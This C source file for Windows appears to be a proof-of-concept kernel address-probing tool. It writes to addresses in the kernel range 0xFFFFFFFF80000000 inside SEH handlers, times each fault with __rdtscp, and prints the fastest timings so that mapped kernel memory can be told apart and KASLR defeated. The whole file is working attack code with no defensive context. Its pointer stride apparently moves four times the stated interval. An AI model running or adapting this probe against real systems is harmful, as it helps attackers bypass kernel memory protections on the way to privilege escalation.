
#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <excpt.h>
#include <intrin.h>
#include <basetsd.h>

#define PROBBASE	0xFFFFFFFF80000000
#define	PROBINTV	0x10000
#define	NUMMEAS		(0x80000000 / PROBINTV)

UINT64 probTime(volatile int *pInt)
{
	UINT64 timeBegin, timeDiff;
	UINT32 aux;
	__try
	{
		//printf("Triggering SEH exception\r\n");
		timeBegin = __rdtscp(&aux);
		*pInt = 20;
	}
	__except (1)//(EXCEPTION_EXECUTE_HANDLER)
	{
		//printf("Executing SEH __except block\r\n");
		timeDiff = __rdtscp(&aux) - timeBegin;
	}
	return timeDiff;
}

int main()
{

	volatile int *pInt = (int*)PROBBASE;
	int i, j;
	UINT64 meas[NUMMEAS], measTmp;

	// Probe every address before measurements
	for (i = 0; i < NUMMEAS; i++) {
		probTime(pInt);
		pInt += PROBINTV;
	}

	// Take the first measurements
	pInt = (int*)PROBBASE;
	for (i = 0; i < NUMMEAS; i++) {
		meas[i] = probTime(pInt);
		pInt += PROBINTV;
	}

	// Take the minimal values in the following measurements
	
	for (j = 0; j < 5; j++) {
		pInt = (int*)PROBBASE;
		for (i = 0; i < NUMMEAS; i++) {
			measTmp = probTime(pInt);
			if (measTmp < meas[i]) meas[i] = measTmp;
			pInt += PROBINTV;
		}
	}

	for (i = 0; i < NUMMEAS; i++)
		printf("%I64d\n", meas[i]);

	return 0;
}